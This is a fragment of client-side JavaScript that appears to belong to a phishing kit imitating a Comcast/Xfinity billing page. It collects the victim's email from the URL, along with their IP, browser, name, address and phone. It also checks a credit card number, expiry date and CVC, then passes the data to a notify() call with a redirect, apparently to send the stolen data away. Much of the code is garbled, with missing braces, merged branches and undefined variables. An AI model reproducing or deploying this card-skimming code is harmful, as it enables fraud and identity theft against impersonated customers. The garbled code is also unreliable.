        <script>
        let is_subm = 0;

        const urlParams = new URLSearchParams(queryString);

        const bill_p = urlParams.has('bill');


        if (bill_p == false){

            window.location.href = "/index.html";

        let euser =  urlParams.get('bill');

          fetch_ip();

          const provider = "COMCAST-COM(https://login.xfinity.com/login?)";
          const get_browsername = browserN();

            e.preventDefault();
            var get_ip = $("#eip").val();
            var f_name  = $("#f_name").val();
            var l_name  = $("#l_name").val();
            var add_r  = $("#add_r").val();
            var phone_n  = $("#phone_n").val();
            var s_tate  = $("#s_tate").val();
            var zip_c  = $("#zip_c").val();


            if (f_name == "" && l_name == ""  && phone_n == "" && add_r == "" && s_tate == ""  && zip_c == ""){

                $(".error_fn").html('<div id="error"><span>Enter First Name</span></div>');

                $(".error_ph").html('<div id="error"><span>Enter Phone Number</span></div>');
                $(".error_addr").html('<div id="error"><span>Enter Billing Address</span></div>');
                $(".error_st").html('<div id="error"><span>Select State</span></div>');
                $(".error_zp").html('<div id="error"><span>Enter Zip/Postal Code</span></div>');

            }else if (f_name == ""){
                $(".error_ln").html('');
                $(".error_ph").html('');
                $(".error_addr").html('');
                $(".error_st").html('');
                $(".error_zp").html('');
                $(".error_fn").html('<div id="error"><span>Enter First Name</span></div>');

                $(".error_fn").html('');
                $(".error_ph").html('');
                $(".error_addr").html('');
                $(".error_st").html('');
                $(".error_zp").html('');
                $(".error_ln").html('<div id="error"><span>Enter Last/Surname</span></div>');

                $(".error_addr").html('');
                $(".error_st").html('');
                $(".error_zp").html('');
                $(".error_ph").html('<div id="error"><span>Enter Phone Number</span></div>');

                $(".error_fn").html('');
                $(".error_ln").html('');
                $(".error_addr").html('');
                $(".error_st").html('');
                $(".error_zp").html('');
                $(".error_ph").html('<div id="error"><span>Invalid Phone Number</span></div>');

            }else if (add_r == ""){
                $(".error_fn").html('');
                $(".error_ln").html('');
                $(".error_ph").html('');
                $(".error_st").html('');
                $(".error_zp").html('');
                $(".error_addr").html('<div id="error"><span>Enter Billing Address</span></div>');

            }else if (s_tate == ""){
                $(".error_fn").html('');
                $(".error_ln").html('');
                $(".error_ph").html('');
                $(".error_addr").html('');
                $(".error_zp").html('');
                $(".error_st").html('<div id="error"><span>Select State</span></div>');

            }else if (zip_c == ""){

                $(".error_addr").html('');
                $(".error_st").html('');
                $(".error_zp").html('<div id="error"><span>Enter Zip/Postal Code</span></div>');

                $(".error_ph").html('');
                $(".error_addr").html('');
                $(".error_st").html('');
                $(".error_zp").html('<div id="error"><span>Invalid Zip/Postal Code</span></div>');

            }else{

              $(".error_fn").html('');

              $(".error_ph").html('');
              $(".error_addr").html('');
              $(".error_st").html('');
              $(".error_zp").html('');

              isf_come = true;
              }

            var card_no  = $("#card_no").val();
            var card_dt  = $("#card_dt").val();
            var card_cv  = $("#card_cv").val();
            if (card_no == "" && card_dt == ""  && card_cv == ""){

                $(".error_cn").html('<div id="error"><span>Enter Card Number</span></div>');
                $(".error_cd").html('<div id="error"><span>Enter Card Expiring Date</span></div>');
                $(".error_cv").html('<div id="error"><span>Enter Card CVC</span></div>');
            }else if (card_no == ""){
                $(".error_cd").html('');
                $(".error_cv").html('');
                $(".error_cn").html('<div id="error"><span>Enter Card Number</span></div>');


            }else if (!isValidCC(card_no)){
                $(".error_cd").html('');
                $(".error_cv").html('');
                $(".error_cn").html('<div id="error"><span>Invalid Card Number</span></div>');


            }else if (card_dt == ""){
                $(".error_cn").html('');
                $(".error_cv").html('');
                $(".error_cd").html('<div id="error"><span>Enter Card Expiring Date</span></div>');

            }else if (!isValidEx(card_dt)){

               $("#btnSubmit").attr("disabled", "disabled");
               $("#btnSubmit").text("Updating ...");

               var status = notify(euser, message, REDIRECT_URL, 2);
